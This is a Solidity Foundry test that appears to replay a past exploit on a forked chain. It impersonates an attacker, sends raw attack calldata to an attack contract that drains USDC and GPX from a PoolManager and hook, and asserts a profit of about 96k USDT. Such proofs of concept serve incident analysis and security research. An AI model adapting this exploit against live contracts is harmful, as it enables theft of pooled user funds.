// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); }

contract GPXHooksUSDCDrainPoC is Test {
    address constant ATTACKER        = 0x4a5FD2e9357cC87DF4cD6A1808174DBc8646899F;
    address constant ATTACK_CONTRACT = 0x3d69591a3868FE77B531187486862c459Cce4e86;
    address constant USDT            = 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2;
    address constant USDC            = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant POOL_MANAGER    = 0x498581fF718922c3f8e6A244956aF099B2652b2b;
    address constant GPX             = 0x454F8c3f1FC79a98363DB6104A20AC59A02A3133;
    address constant HOOK            = 0x4519e2b040ff1B64fa03aBe2AeF0BC99D7CcEaA8;

    function test_replay_usdc_drain() public {
        uint256 attUsdtBefore = IERC20(USDT).balanceOf(ATTACKER);
        uint256 pmUsdcBefore  = IERC20(USDC).balanceOf(POOL_MANAGER);
        uint256 pmGpxBefore   = IERC20(GPX).balanceOf(POOL_MANAGER);
        uint256 hookGpxBefore = IERC20(GPX).balanceOf(HOOK);

        bytes memory cd = hex"e2d01283000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb000000000000000000000000498581ff718922c3f8e6a244956af099b2652b2b0000000000000000000000007c5f5a4bbd8fd63184577525326123b519429bdc0000000000000000000000004519e2b040ff1b64fa03abe2aef0bc99d7cceaa8000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda029130000000000000000000000004200000000000000000000000000000000000006000000000000000000000000454f8c3f1fc79a98363db6104a20ac59a02a3133000000000000000000000000fde4c96c8593536e31f229ea8f37b2ada2699bb20000000000000000000000002626664c2603336e57b271c5c0b26f421741e481000000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000028bed0160000000000000000000000000000000000000000000000000073d4c4d5fa733d290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000358d117c00fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffccbb0fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffccbba0000000000000000000000000000000000000000000000000000000147d357000000000000000000000000000000000000000000000000000000000147d357000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000165486b48a0000000000000000000000004a5fd2e9357cc87df4cd6a1808174dbc8646899f";

        vm.prank(ATTACKER);
        (bool ok, ) = ATTACK_CONTRACT.call(cd);
        require(ok, "exploit call reverted on fork");

        uint256 attUsdtAfter = IERC20(USDT).balanceOf(ATTACKER);
        uint256 pmUsdcAfter  = IERC20(USDC).balanceOf(POOL_MANAGER);
        uint256 pmGpxAfter   = IERC20(GPX).balanceOf(POOL_MANAGER);
        uint256 hookGpxAfter = IERC20(GPX).balanceOf(HOOK);

        emit log_named_uint("attacker USDT gained (6dp)", attUsdtAfter - attUsdtBefore);
        emit log_named_uint("PoolManager USDC lost (6dp)", pmUsdcBefore - pmUsdcAfter);
        emit log_named_decimal_uint("PoolManager GPX lost (18dp)", pmGpxBefore - pmGpxAfter, 18);
        emit log_named_decimal_uint("HOOK GPX gained (18dp)", hookGpxAfter - hookGpxBefore, 18);

        assertGt(attUsdtAfter, attUsdtBefore, "no profit => not exploitable");
        assertGe(attUsdtAfter - attUsdtBefore, 90000e6, "profit below ~96k USDT");
        assertGt(pmUsdcBefore - pmUsdcAfter, 100000e6, "pool USDC loss below ~114k");
    }
}
